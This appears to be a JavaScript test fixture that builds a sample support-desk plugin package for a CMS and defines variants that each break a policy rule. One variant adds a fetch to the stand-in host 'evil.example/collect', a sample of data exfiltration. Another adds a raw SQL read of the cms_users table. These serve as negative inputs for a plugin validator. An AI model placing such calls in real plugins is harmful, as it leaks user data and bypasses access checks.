// A CMS plugin package: a resource, a before-write hook, a dashboard view, a slot widget,
// a block type and a command. Variants break one policy rule each, or change the schema.
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';

const run = promisify(execFile);

export function deskManifest(version, overrides = {}) {
  return {
    schemaVersion: 1, name: 'support-desk', version, description: 'Support tickets',
    compatibility: { '@cossackframework/cms': '>=0.9.0' },
    resources: [{
      name: 'tickets', label: 'Tickets', titleField: 'subject', ownership: true,
      fields: {
        subject: { kind: 'string', required: true, max: 120, search: true, ...(overrides.uniqueSubject ? { unique: true } : {}) },
        status: { kind: 'enum', values: ['open', 'closed'], required: true, default: 'open', index: true },
        body: { kind: 'text', search: true },
      },
      access: { read: 'authenticated', create: 'authenticated', update: { any: ['owner', { permission: 'support-desk/tickets:update' }] }, delete: { permission: 'support-desk/tickets:delete' } },
    }],
    blocks: [{ name: 'support-desk/contact', label: 'Support contact', fields: { email: { kind: 'string', required: true, max: 120, label: 'Email' } } }],
    hooks: [{ point: 'cms.resource.before-write', version: 1 }],
    permissions: { resources: { 'cms/posts': ['read'] }, define: ['support-desk:triage'] },
    ui: { slots: { 'dashboard.nav': [{ label: 'Support', href: '/dashboard/support' }] } },
    commands: [{ name: 'close-all', description: 'Close every open ticket.', permission: 'support-desk:triage', options: { reason: { type: 'string', description: 'Why the tickets close.' } } }],
  };
}

const server = (extra = '') => `import { beforeWrite } from '@cossackframework/cms';
import type { PluginContext } from '@cossackframework/cms/server';

export function register(context: PluginContext) {
  context.hooks.addFilter(beforeWrite, (draft, { input }) =>
    input.resource === 'support-desk/tickets' && typeof draft.subject === 'string' ? { ...draft, subject: draft.subject.trim() } : draft);
  context.commands.add('close-all', async (input, { principal }) => {
    const tickets = context.cms.resource('support-desk/tickets');
    const page = await tickets.list({ where: { status: 'open' }, limit: 100 }, { principal });
    for (const ticket of page.records) await tickets.update(ticket.id, { status: 'closed' }, { principal, expectedRevision: ticket.rev });
    return { closed: page.records.length, reason: input.reason ?? null };
  });
${extra}}
`;

const sources = {
  'server.ts': server(),
  'pages/dashboard/support/index.ts': `import { Cossack, Page, State } from '@cossackframework/core';
import { html } from '@cossackframework/renderer';

@Page({ transport: 'http' })
export default class SupportDesk extends Cossack {
  @State() open = 0;
  @State() error = '';

  async init() {
    try {
      const tickets = this.c.get('cms').pluginCms('support-desk').resource('support-desk/tickets');
      this.open = (await tickets.list({ where: { status: 'open' }, limit: 100 }, { principal: this.c.get('principal') })).records.length;
    } catch (error) {
      this.error = (error as Error).message;
    }
  }

  render() {
    return html\`<div class="space-y-2">
      <h1 class="text-2xl font-bold">Support</h1>
      <p data-testid="open-tickets">Open tickets: \${this.open}</p>
      \${this.error ? html\`<p role="alert">\${this.error}</p>\` : null}
    </div>\`;
  }
}
`,
  'ui.ts': `import { Component, Cossack } from '@cossackframework/core';
import { html } from '@cossackframework/renderer';

@Component()
export class SupportWidget extends Cossack {
  render() {
    return html\`<div class="rounded-lg border border-border p-4" data-testid="support-widget">Support desk is active</div>\`;
  }
}

/** Renders the support-desk/contact block on the site. */
@Component()
export class SupportContact extends Cossack {
  declare props: { block: { data: { email?: string } } };
  render() {
    return html\`<p data-testid="support-contact">Write to \${this.props.block.data.email ?? ''}</p>\`;
  }
}

/** Components for CMS host slots. */
export const slots = { 'dashboard.overview': [SupportWidget] };

/** Block renderers by block name. */
export const blocks = { contact: SupportContact };
`,
};

export const violations = {
  raw: { 'server.ts': server(`  void 'SELECT * FROM cms_users WHERE id = 1';\n`) },
  network: { 'server.ts': server(`  void fetch('https://evil.example/collect');\n`) },
  permission: { 'server.ts': server(`  context.commands.add('noop', async (_input, { principal }) => hasPermission(principal, 'cms:users'));\n`).replace("import { beforeWrite } from '@cossackframework/cms';", "import { beforeWrite, hasPermission } from '@cossackframework/cms';") },
};

/** Write the package and pack it; returns `{ directory, tarball }`. */
export async function packDesk(version, { files = {}, manifest = {} } = {}) {
  const directory = await fs.mkdtemp(path.join(os.tmpdir(), `support-desk-cms-${version}-`));
  const all = {
    'package.json': JSON.stringify({ name: '@acme/support-desk', version, type: 'module', cossack: { plugin: 'cossack-plugin.json' }, files: ['plugin', 'cossack-plugin.json'] }, null, 2),
    'cossack-plugin.json': JSON.stringify(deskManifest(version, manifest), null, 2),
    ...Object.fromEntries(Object.entries({ ...sources, ...files }).map(([rel, content]) => [`plugin/${rel}`, content])),
  };
  for (const [rel, content] of Object.entries(all)) {
    await fs.mkdir(path.dirname(path.join(directory, rel)), { recursive: true });
    await fs.writeFile(path.join(directory, rel), content);
  }
  const { stdout } = await run('npm', ['pack', '--ignore-scripts', '--silent', '--pack-destination', directory], { cwd: directory });
  return { directory, tarball: path.join(directory, stdout.trim().split('\n').pop()) };
}
